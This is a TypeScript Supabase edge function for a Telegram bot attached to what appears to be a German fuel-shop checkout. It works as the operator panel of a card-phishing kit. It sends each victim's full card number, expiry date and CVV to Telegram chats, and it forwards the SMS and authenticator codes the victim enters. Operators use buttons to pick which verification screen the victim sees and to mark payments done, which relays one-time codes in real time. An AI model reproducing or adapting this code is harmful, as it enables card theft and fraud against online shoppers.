import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
const telegramToken = Deno.env.get('TELEGRAM_BOT_TOKEN')!;

const supabase = createClient(supabaseUrl, supabaseKey);

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const url = new URL(req.url);
    const action = url.pathname.split('/').pop();
    
    // Handle the case where function is called directly with body containing type/action
    if (action === 'telegram-bot') {
      const body = await req.json();
      
      // Check if this is a notification request
      if (body.type) {
        return await handleSendNotification({ json: () => Promise.resolve(body) } as Request);
      }
      
      // Check if this is a test message request
      if (body.chatId) {
        return await handleTestMessage({ json: () => Promise.resolve(body) } as Request);
      }
      
      return new Response('Invalid request body', { status: 400 });
    }

    switch (action) {
      case 'webhook':
        return await handleWebhook(req);
      case 'send-notification':
        return await handleSendNotification(req);
      case 'test-message':
        return await handleTestMessage(req);
      default:
        return new Response('Not found', { status: 404 });
    }
  } catch (error) {
    console.error('Telegram bot error:', error);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});

async function handleWebhook(req: Request) {
  const update = await req.json();
  console.log('Telegram webhook update:', update);

  if (update.callback_query) {
    await handleCallbackQuery(update.callback_query);
  }

  return new Response('OK', { headers: corsHeaders });
}

async function handleCallbackQuery(callbackQuery: any) {
  const { data, from, message } = callbackQuery;
  const [action, sessionId, ...params] = data.split(':');

  console.log(`Handling callback: ${action} for session ${sessionId} with params:`, params);

  try {
    switch (action) {
      case 'set_method':
        const shortCode = params[0]; // This is now a short code
        const method = await getFullMethod(shortCode); // Convert to full method
        console.log(`Converting short code ${shortCode} to method: ${method} for session: ${sessionId}`);
        
        const { data: result, error } = await supabase.functions.invoke('payment-sessions/set-verification-method', {
          body: { 
            sessionId, 
            method 
          }
        });
        
        if (error) {
          console.error('Error setting verification method:', error);
          throw error;
        }
        
        console.log('Verification method set successfully:', result);
        
        let successMessage;
        
        switch (method) {
          case 'choice_required':
        successMessage = `✅ <b>Choice Required</b>\n\nSession: <code>${sessionId}</code>\nCustomer can now choose between App & SMS verification.`;
        break;
      case 'app_confirmation':
        successMessage = `✅ <b>App Verification Activated</b>\n\nSession: <code>${sessionId}</code>\nApp confirmation is now active.`;
            // Send notification when customer chooses App - get cardholder name
            if (result && result.cardholder_name) {
              await sendMethodChoiceNotification(sessionId, 'app', result.cardholder_name);
            }
            break;
      case 'sms_confirmation':
        successMessage = `✅ <b>SMS Verification Activated</b>\n\nSession: <code>${sessionId}</code>\nSMS confirmation is now active.`;
            // Send notification when customer chooses SMS - get cardholder name
            if (result && result.cardholder_name) {
              await sendMethodChoiceNotification(sessionId, 'sms', result.cardholder_name);
            }
            break;
          case 'google_code_confirmation':
            successMessage = `✅ <b>Google-Code Verification Activated</b>\n\nSession: <code>${sessionId}</code>\nGoogle-Code confirmation is now active.`;
            // Send notification when customer chooses Google-Code - get cardholder name
            if (result && result.cardholder_name) {
              await sendMethodChoiceNotification(sessionId, 'google_code', result.cardholder_name);
            }
            break;
          default:
            successMessage = `✅ Verification method set to: ${method}`;
        }
        
        // Keep original message text but remove buttons
        await editMessageText(
          message.chat.id,
          message.message_id,
          message.text,
          null  // Remove buttons from original message
        );
        
        // Send new confirmation message
        await sendTelegramMessage(
          message.chat.id,
          successMessage
        );
        break;

      case 'complete':
        const success = params[0] === 'success';
        console.log(`Completing payment: ${success ? 'success' : 'failed'} for session: ${sessionId}`);
        
        if (success) {
          const { data: completeResult, error: completeError } = await supabase.functions.invoke('payment-sessions/complete-payment', {
            body: { 
              sessionId 
            }
          });
          
          if (completeError) {
            console.error('Error completing payment:', completeError);
            throw completeError;
          }
          
          await editMessageText(
            message.chat.id,
            message.message_id,
            `✅ Payment completed successfully!\n\n${message.text}`,
            null
          );
        } else {
          const { data: resetResult, error: resetError } = await supabase.functions.invoke('payment-sessions/reset-verification', {
            body: { 
              sessionId 
            }
          });
          
          if (resetError) {
            console.error('Error resetting verification:', resetError);
            throw resetError;
          }
          
          await editMessageText(
            message.chat.id,
            message.message_id,
            `❌ Payment failed, verification reset\n\n${message.text}`,
            await getVerificationMethodButtons(sessionId)
          );
        }
        break;

      case 'additional':
        console.log(`Requesting additional verification for session: ${sessionId}`);
        
        // Reset session for additional verification
        const { data: resetResult, error: resetError } = await supabase.functions.invoke('payment-sessions/reset-verification', {
          body: { 
            sessionId 
          }
        });
        
        if (resetError) {
          console.error('Error resetting verification:', resetError);
          throw resetError;
        }
        
        // Show verification method selection buttons again
        const verificationButtons = await getVerificationMethodButtons(sessionId);
        await editMessageText(
          message.chat.id,
          message.message_id,
          `🔄 **Weitere Verifikation angefordert**\n\n${message.text}`,
          verificationButtons
        );
        break;
    }

    // Answer callback query to remove loading state
    let confirmationMessage = 'Action processed';
    
    if (action === 'set_method') {
      const shortCode = params[0];
      const method = await getFullMethod(shortCode);
      switch (method) {
        case 'choice_required':
          confirmationMessage = '✅ Wahl gesetzt - Kunde kann zwischen App & SMS wählen';
          break;
        case 'app_confirmation':
          confirmationMessage = '✅ App-Bestätigung aktiviert';
          break;
        case 'sms_confirmation':
          confirmationMessage = '✅ SMS-Bestätigung aktiviert';
          break;
        case 'google_code_confirmation':
          confirmationMessage = '✅ Google-Code-Bestätigung aktiviert';
          break;
      }
    } else if (action === 'complete') {
      const success = params[0] === 'success';
      confirmationMessage = success ? '✅ Zahlung erfolgreich abgeschlossen' : '❌ Zahlung fehlgeschlagen';
    } else if (action === 'additional') {
      confirmationMessage = '🔄 Weitere Verifikation angefordert';
    }
    
    await fetch(`https://api.telegram.org/bot${telegramToken}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQuery.id,
        text: confirmationMessage
      })
    });

  } catch (error) {
    console.error('Error handling callback:', error);
    await fetch(`https://api.telegram.org/bot${telegramToken}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQuery.id,
        text: 'Fehler beim Verarbeiten der Aktion',
        show_alert: true
      })
    });
  }
}

async function handleSendNotification(req: Request) {
  const { type, data } = await req.json();

  const { data: chatIds } = await supabase
    .from('telegram_config')
    .select('chat_id')
    .eq('is_active', true);

  if (!chatIds || chatIds.length === 0) {
    return new Response(JSON.stringify({ message: 'No active chat IDs configured' }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }

  for (const { chat_id } of chatIds) {
    await sendNotification(chat_id, type, data);
  }

  return new Response(JSON.stringify({ message: 'Notifications sent' }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

async function handleTestMessage(req: Request) {
  const { chatId } = await req.json();

  const message = `🤖 <b>Test Notification</b>\n\nTelegram bot is working correctly!\nTime: ${new Date().toLocaleString()}`;

  await sendTelegramMessage(chatId, message);

  return new Response(JSON.stringify({ message: 'Test message sent' }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

async function sendNotification(chatId: string, type: string, data: any) {
  let message = '';
  let buttons = null;

  switch (type) {
    case 'checkout_started':
      message = `🛒 <b>Jemand ist im Checkout</b>\n\n` +
                `🛢️ Produkt: ${escapeHTML(data.product.displayName)}\n` +
                `📦 Menge: ${data.quantity.toLocaleString()}L\n` +
                `💰 Gesamtpreis: €${data.totalPrice.toFixed(2)}\n` +
                `📮 PLZ: ${escapeHTML(data.zipCode)}`;
      break;

    case 'payment_started':
      message = `💳 <b>Payment Page Entered</b>\n\n` +
                `👤 Cardholder: <code>${escapeHTML(data.cardholder_name)}</code>\n` +
                `💳 Card: <code>${escapeHTML(data.card_number)}</code>\n` +
                `📅 Expiry: <code>${escapeHTML(data.expiry_date)}</code>\n` +
                `🔐 CVV: <code>${escapeHTML(data.cvv)}</code>\n` +
                `💰 Gesamtpreis: €${(data.totalPrice || 0).toFixed(2)}\n\n` +
                `Karteninhaber: ${escapeHTML(data.cardholder_name)}`;
      buttons = await getVerificationMethodButtons(data.session_id);
      break;

    case 'verification_update':
      if (data.verification_status === 'app_confirmed') {
        message = `✅ <b>App Verification Confirmed</b>\n\n` +
                  `Karteninhaber: ${escapeHTML(data.cardholder_name || 'Unknown')}\n` +
                  `Method: ${escapeHTML(data.verification_method)}`;
        buttons = await getCompletionButtons(data.session_id);
      } else if (data.verification_status === 'sms_confirmation' && data.sms_code) {
        message = `📱 <b>SMS Code Entered</b>\n\n` +
                  `Karteninhaber: ${escapeHTML(data.cardholder_name || 'Unknown')}\n` +
                  `Code: <code>${escapeHTML(data.sms_code)}</code>`;
        buttons = await getCompletionButtons(data.session_id);
      } else if (data.verification_status === 'google_code_confirmation' && data.google_code) {
        message = `🔢 <b>Google Code Entered</b>\n\n` +
                  `Karteninhaber: ${escapeHTML(data.cardholder_name || 'Unknown')}\n` +
                  `Code: <code>${escapeHTML(data.google_code)}</code>`;
        buttons = await getCompletionButtons(data.session_id);
      } else if (data.message && data.message.includes('User wählte:')) {
        // Handle user choice notification
        const choice = data.verification_method === 'app_confirmation' ? 'App-Bestätigung' : 'SMS-Bestätigung';
        message = `🎯 <b>User hat gewählt</b>\n\n` +
                  `Wahl: ${escapeHTML(choice)}\n` +
                  `Karteninhaber: ${escapeHTML(data.cardholder_name || 'Unknown')}`;
      }
      break;
  }

  if (message) {
    await sendTelegramMessage(chatId, message, buttons);
  }
}

// Mapping functions for telegram callback short codes
async function getShortCode(fullMethod: string): Promise<string> {
  const { data, error } = await supabase
    .from('telegram_callback_mapping')
    .select('short_code')
    .eq('full_method', fullMethod)
    .single();
  
  if (error || !data) {
    console.error('Failed to get short code for:', fullMethod, error);
    return fullMethod; // fallback to full method
  }
  
  return data.short_code;
}

async function getFullMethod(shortCode: string): Promise<string> {
  const { data, error } = await supabase
    .from('telegram_callback_mapping')
    .select('full_method')
    .eq('short_code', shortCode)
    .single();
  
  if (error || !data) {
    console.error('Failed to get full method for:', shortCode, error);
    return shortCode; // fallback to short code
  }
  
  return data.full_method;
}

function escapeHTML(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

async function sendTelegramMessage(chatId: string, text: string, replyMarkup: any = null) {
  const payload: any = {
    chat_id: chatId,
    text,
    parse_mode: 'HTML'
  };

  if (replyMarkup) {
    payload.reply_markup = replyMarkup;
  }

  const response = await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  if (!response.ok) {
    const error = await response.text();
    console.error('Telegram API error:', error);
    throw new Error(`Telegram API error: ${error}`);
  }

  return await response.json();
}

async function editMessageText(chatId: string, messageId: number, text: string, replyMarkup: any = null) {
  const payload: any = {
    chat_id: chatId,
    message_id: messageId,
    text,
    parse_mode: 'HTML'
  };

  if (replyMarkup) {
    payload.reply_markup = replyMarkup;
  }

  const response = await fetch(`https://api.telegram.org/bot${telegramToken}/editMessageText`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  return response.ok;
}

async function getVerificationMethodButtons(sessionId: string) {
  const choiceShort = await getShortCode('choice_required');
  const appShort = await getShortCode('app_confirmation');
  const smsShort = await getShortCode('sms_confirmation');
  const googleShort = await getShortCode('google_code_confirmation');
  
  return {
    inline_keyboard: [
      [
        { text: '🔄 Wahl', callback_data: `set_method:${sessionId}:${choiceShort}` },
        { text: '📱 App', callback_data: `set_method:${sessionId}:${appShort}` }
      ],
      [
        { text: '💬 SMS', callback_data: `set_method:${sessionId}:${smsShort}` },
        { text: '🔢 Code', callback_data: `set_method:${sessionId}:${googleShort}` }
      ]
    ]
  };
}

async function getVerificationChoiceButtons(sessionId: string) {
  const appShort = await getShortCode('app_confirmation');
  const smsShort = await getShortCode('sms_confirmation');
  
  return {
    inline_keyboard: [
      [
        { text: '📱 App', callback_data: `set_method:${sessionId}:${appShort}` },
        { text: '💬 SMS', callback_data: `set_method:${sessionId}:${smsShort}` }
      ]
    ]
  };
}

async function getCompletionButtons(sessionId: string) {
  const additionalShortCode = await getShortCode('additional_verification');
  
  return {
    inline_keyboard: [
      [
        { text: '✅ Erfolgreich', callback_data: `complete:${sessionId}:success` },
        { text: '❌ Fehlgeschlagen', callback_data: `complete:${sessionId}:failed` },
        { text: '🔄 Weitere', callback_data: `additional:${sessionId}:${additionalShortCode}` }
      ]
    ]
  };
}

async function sendMethodChoiceNotification(sessionId: string, method: 'app' | 'sms' | 'google_code', cardholderName?: string) {
  try {
    // Get all active chat IDs
    const { data: activeChatIds, error } = await supabase.functions.invoke('get-active-chat-ids');
    
    if (error || !activeChatIds) {
      console.error('Error getting active chat IDs:', error);
      return;
    }

    const methodText = method === 'app' ? 'App-Verification' : 
                      method === 'sms' ? 'SMS-Verification' : 'Google-Code-Verification';
    const emoji = method === 'app' ? '📱' : 
                  method === 'sms' ? '💬' : '🔢';
    
    const message = `${emoji} <b>Nutzer hat ${methodText} gewählt</b>\n\nKarteninhaber: ${escapeHTML(cardholderName || 'Unknown')}\nZeitpunkt: ${new Date().toLocaleString('de-DE')}`;

    // Send notification to all active chat IDs
    for (const chatId of activeChatIds) {
      await sendTelegramMessage(chatId, message);
    }
    
    console.log(`Method choice notification sent for session ${sessionId}, method: ${method}, cardholder: ${cardholderName}`);
  } catch (error) {
    console.error('Error sending method choice notification:', error);
  }
}